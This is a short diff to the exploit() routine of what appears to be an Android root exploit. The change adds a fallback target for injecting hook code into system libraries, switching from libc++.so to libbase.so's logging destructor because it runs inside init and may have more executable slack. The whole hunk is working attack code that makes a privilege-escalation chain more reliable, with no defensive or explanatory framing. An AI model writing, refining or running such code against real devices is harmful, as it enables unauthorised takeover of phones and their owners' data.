@@ -555,10 +555,18 @@ static int exploit(void) {
     int rc = 3;
     if (patch_helper()) goto done;
     if (patch_ko()) goto done;
-    if (patch_hook("/system/lib64/libc++.so",
-                   "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
-                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
-                   &g_libcxx_r)) goto done;
+    int hook_rc = patch_hook("/system/lib64/libc++.so",
+                             "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
+                             libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
+                             &g_libcxx_r);
+    /* Target selection returns 1 before writing. libbase's logging destructor
+     * also runs when init reaps an orphan, and may have more executable slack. */
+    if (hook_rc == 1)
+        hook_rc = patch_hook("/system/lib64/libbase.so",
+                             "_ZN7android4base10LogMessageD1Ev",
+                             libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
+                             &g_libcxx_r);
+    if (hook_rc) goto done;
 
     rc = 2;
     usleep(500000);
